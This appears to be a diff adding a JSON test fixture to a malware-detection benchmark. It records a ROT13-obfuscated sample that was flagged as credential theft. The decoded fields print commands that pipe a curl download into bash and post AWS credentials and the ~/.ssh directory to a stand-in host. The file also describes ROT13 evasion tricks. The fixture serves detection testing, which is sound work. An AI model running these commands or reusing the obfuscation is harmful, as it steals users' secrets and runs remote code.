@@ -1,0 +1,81 @@
+{
+  "sample_id": "adv-007-rot13-simple",
+  "test_type": "BENCHMARK_TEST_ONLY",
+  "primary_detection": {
+    "code": "ENCODE-007",
+    "name": "ROT13 Obfuscation",
+    "description": "Detected ROT13 cipher used to hide malicious commands and credential theft operations",
+    "confidence": 0.89
+  },
+  "decoded_payload": {
+    "rot13_transformations": [
+      {
+        "encoded": "vzcbeg bf",
+        "decoded": "import os"
+      },
+      {
+        "encoded": "bf.flfgrz",
+        "decoded": "os.system"
+      },
+      {
+        "encoded": "phey",
+        "decoded": "curl"
+      },
+      {
+        "encoded": "[ERQNPGRQ]",
+        "decoded": "[REDACTED]"
+      }
+    ],
+    "full_decoded_commands": [
+      "import os; os.system('curl https://[REDACTED].example.com/stealtokens | bash')",
+      "import os; os.system('cat ~/.aws/credentials | curl -X POST -d @- https://[REDACTED].example.com/aws')",
+      "import os; os.system('tar cz ~/.ssh | curl -X POST -d @- https://[REDACTED].example.com/ssh')"
+    ]
+  },
+  "underlying_threats": [
+    {
+      "code": "CRED-003",
+      "name": "AWS Credential Theft",
+      "description": "Exfiltrates AWS credentials from ~/.aws/credentials",
+      "confidence": 0.97
+    },
+    {
+      "code": "CRED-001",
+      "name": "SSH Key Theft",
+      "description": "Compresses and exfiltrates entire ~/.ssh directory",
+      "confidence": 0.96
+    },
+    {
+      "code": "ENV-001",
+      "name": "Environment Variable Exfiltration",
+      "description": "Dumps and exfiltrates all environment variables",
+      "confidence": 0.94
+    },
+    {
+      "code": "NET-001",
+      "name": "Remote Payload Execution",
+      "description": "Downloads and executes remote shell scripts via curl | bash",
+      "confidence": 0.95
+    }
+  ],
+  "obfuscation_technique": {
+    "type": "rot13",
+    "layers": 1,
+    "evasion_techniques": [
+      "String concatenation to split ROT13 payload",
+      "Variable indirection",
+      "Multiple separate payloads"
+    ],
+    "decode_method": "codecs.decode(string, 'rot_13')"
+  },
+  "targeted_credentials": [
+    "~/.aws/credentials",
+    "~/.ssh/*",
+    "Environment variables",
+    "API tokens"
+  ],
+  "risk_score": 9.4,
+  "verdict": "确认恶意",
+  "verdict_english": "Confirmed Malicious",
+  "reasoning": "ROT13 cipher used to obfuscate multiple credential theft payloads. Despite being a simple substitution cipher, it effectively hides sensitive targets like AWS credentials and SSH keys from basic pattern matching. String concatenation used as additional evasion technique."
+}
